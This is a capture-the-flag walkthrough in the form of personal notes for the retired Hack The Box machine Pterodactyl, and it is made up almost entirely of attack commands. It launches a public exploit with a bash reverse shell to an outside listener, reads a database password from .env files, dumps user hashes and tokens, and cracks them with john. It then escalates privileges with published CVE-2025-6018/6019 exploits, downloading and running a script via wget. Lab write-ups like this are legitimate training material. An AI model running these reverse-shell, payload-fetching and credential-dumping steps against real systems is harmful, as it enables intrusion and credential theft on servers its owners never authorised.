# Pterodactyl

> Retired Hack The Box machine. Personal lab notes for authorized use only.

# Gobuster to find directories and subdomains

```
gobuster dir vhost -u http://pterodactyl.htb -w <path-to-subdomain.txt> --append-domain
```


# Reverse Shell

```
https://github.com/YoyoChaud/CVE-2025-49132.git
```


# Kali Terminal 1

```
python3 exploit.py http://panel.fr --rce-cmd "/bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
```


# Kali Terminal 2

```
nc -lvnp 4444
```


# Inside the wwwrun after success reverse shell

```
find / -type f -name ".env" 2>/dev/null
```

# Found the information about the Maria Database

```
mysql -h 127.0.0.1 -P 3306 -u pterodactyl -pPteraPanel panel
```

# Show tables and found the hash of the user

```
MariaDB [panel]> select * from users;
```

```
select * from users;
```


Found the users

```
headmonitor  | headmonitor@pterodactyl.htb  | Head  | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU 
```

```
phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 
```


# Crack the hash of user phileasfogg3

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```



# SSH to user phileasfogg3 and try to privilege escalation

```
https://github.com/dreysanox/CVE-2025-6018_Poc/tree/main
https://github.com/harshitvarma05/CVE-2025-6019/tree/main
```


# In kali machine

```
sudo apt update && sudo apt install -y xfsprogs
git clone https://github.com/harshitvarma05/CVE-2025-6019/tree/main
cd ~/HTB/VPN/Pterodactyl/CVE-2025-6019
python3 -m http.server


sudo ./attacker.sh
[L]ocal or [C]ible? (L/C): L
scp xfs.image phileasfogg3@10.129.1.119:/tmp/
```


# In box machine

```
cd ~
echo 'XDG_SEAT=seat0' > .pam_environment
echo 'XDG_VTNR=1' >> .pam_environment
echo 'XDG_SESSION_CLASS=user' >> .pam_environment
echo 'XDG_SESSION_TYPE=tty' >> .pam_environment
exit
```


# Re-ssh to the box machine

```
cd /tmp
wget http://<kali-ip>:8000/CVE-2025-6019/main/target.sh
chmod +x target.sh
./target.sh
```

